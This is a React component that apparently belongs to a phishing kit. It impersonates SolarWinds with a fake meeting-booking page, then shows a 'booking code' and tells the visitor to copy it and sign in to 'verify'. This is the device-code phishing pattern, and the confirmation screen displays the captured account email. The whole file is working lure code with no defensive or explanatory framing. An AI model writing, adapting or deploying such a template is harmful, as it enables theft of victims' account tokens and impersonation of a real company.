import React, { useState } from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

const TIME_SLOTS = ['9:00 AM', '9:30 AM', '10:00 AM', '10:30 AM', '11:00 AM', '11:30 AM', '1:00 PM', '1:30 PM', '2:00 PM', '2:30 PM', '3:00 PM', '3:30 PM'];

export function SolarWindsTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('solarwinds-meeting');
  const [selectedTime, setSelectedTime] = useState('');
  const [meetingType, setMeetingType] = useState('demo');

  return (
    <div className="tpl-page" style={{ background: '#1a1a2e' }}>
      <div className="tpl-container" style={{ maxWidth: 560 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#F58220"/><circle cx="16" cy="16" r="8" fill="none" stroke="white" strokeWidth="2"/><circle cx="16" cy="16" r="3" fill="white"/></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#fff' }}>SolarWinds</span>
        </div>

        <div className="tpl-card" style={{ background: '#16213e', border: '1px solid #2a3a5c', color: '#e0e0e0' }}>
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title" style={{ color: '#fff' }}>Book a Meeting</h1>
              <p style={{ fontSize: 14, color: '#a0aec0', lineHeight: 1.6, marginBottom: 16 }}>Schedule a session with our team. Select a meeting type and time.</p>

              <div style={{ marginBottom: 16 }}>
                <div style={{ fontSize: 13, fontWeight: 600, marginBottom: 8, color: '#cbd5e0' }}>Meeting Type</div>
                <div style={{ display: 'flex', gap: 8 }}>
                  {[{ id: 'demo', label: 'Product Demo' }, { id: 'support', label: 'Technical Support' }, { id: 'consult', label: 'Consultation' }].map(t => (
                    <button key={t.id} onClick={() => setMeetingType(t.id)} style={{
                      flex: 1, padding: '10px 8px', border: meetingType === t.id ? '2px solid #F58220' : '1px solid #2a3a5c',
                      borderRadius: 6, background: meetingType === t.id ? 'rgba(245,130,32,0.1)' : '#1a1a2e', cursor: 'pointer',
                      fontSize: 12, color: meetingType === t.id ? '#F58220' : '#a0aec0', fontWeight: meetingType === t.id ? 600 : 400
                    }}>{t.label}</button>
                  ))}
                </div>
              </div>

              <div style={{ marginBottom: 16 }}>
                <div style={{ fontSize: 13, fontWeight: 600, marginBottom: 8, color: '#cbd5e0' }}>Available Times</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 6 }}>
                  {TIME_SLOTS.map(t => (
                    <button key={t} onClick={() => setSelectedTime(t)} style={{
                      padding: '8px', border: selectedTime === t ? '2px solid #F58220' : '1px solid #2a3a5c',
                      borderRadius: 4, background: selectedTime === t ? 'rgba(245,130,32,0.1)' : '#1a1a2e', cursor: 'pointer',
                      fontSize: 13, color: selectedTime === t ? '#F58220' : '#a0aec0', fontWeight: selectedTime === t ? 600 : 400
                    }}>{t}</button>
                  ))}
                </div>
              </div>

              {selectedTime && <button className="tpl-btn" style={{ background: '#F58220', color: '#fff' }} onClick={f.handleStart}>Book {selectedTime}</button>}
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p style={{ color: '#a0aec0' }}>Reserving your slot...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title" style={{ color: '#fff' }}>Verify Your Identity</h1>
              <p style={{ fontSize: 14, color: '#a0aec0', marginBottom: 16 }}>Enter this code to confirm your booking.</p>
              <div className="tpl-code-box" style={{ background: '#1a1a2e', borderColor: '#2a3a5c' }}><div className="tpl-code-label">BOOKING CODE</div><div className="tpl-code" style={{ color: '#F58220' }}>{f.userCode}</div><button className="tpl-copy-btn" style={{ borderColor: '#F58220', color: '#F58220' }} onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps" style={{ color: '#cbd5e0' }}><div className="tpl-step">1. Copy the booking code</div><div className="tpl-step">2. Click verify and sign in</div></div>
              <button className="tpl-btn" style={{ background: '#F58220' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting" style={{ color: '#F58220' }}>Waiting for verification...</p>}
              <p className="tpl-expiry" style={{ color: '#718096' }}>Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#48bb78" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title" style={{ color: '#fff' }}>Booking Confirmed!</h1>{f.authEmail && <p style={{ color: '#a0aec0' }}>Account: <strong>{f.authEmail}</strong></p>}<p style={{ color: '#a0aec0' }}>You will receive a confirmation email.</p><button className="tpl-btn" style={{ background: 'transparent', color: '#F58220', border: '1px solid #F58220' }} onClick={f.handleReset}>Book another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title" style={{ color: '#fff' }}>Code Expired</h1><button className="tpl-btn" style={{ background: '#F58220' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title" style={{ color: '#fff' }}>Error</h1><p style={{ color: '#a0aec0' }}>{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#F58220' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer" style={{ color: '#718096' }}><span>SolarWinds</span><span>Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
